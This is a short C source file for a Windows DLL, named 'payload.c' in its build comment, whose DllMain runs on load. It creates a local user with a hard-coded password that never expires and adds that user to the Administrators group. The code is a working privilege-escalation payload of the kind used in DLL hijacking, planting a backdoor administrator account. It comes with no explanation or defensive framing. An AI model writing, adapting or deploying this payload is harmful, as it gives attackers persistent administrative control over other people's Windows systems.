
#include <windows.h>
#include <stdio.h>
#include <lm.h>


// cl /LD payload.c Netapi32.lib
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    
    WCHAR* target = NULL;
    WCHAR* username = L"testUser";
    WCHAR* passwd = L"password123";
    DWORD level = 1;

    USER_INFO_1 user = {
        .usri1_name = username,
        .usri1_password = passwd,
        .usri1_priv = USER_PRIV_USER,
        .usri1_home_dir = NULL,
        .usri1_script_path = NULL,
        .usri1_password_age = 0, // ignored
        .usri1_flags = UF_DONT_EXPIRE_PASSWD,
        .usri1_comment = NULL
    };

    // Add the user
    NET_API_STATUS nStatus = NetUserAdd(target, level, (LPBYTE)&user, NULL);

    // Make them admin
    LOCALGROUP_MEMBERS_INFO_3 members;
    members.lgrmi3_domainandname = username;
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&members, 1);

    return TRUE;
}

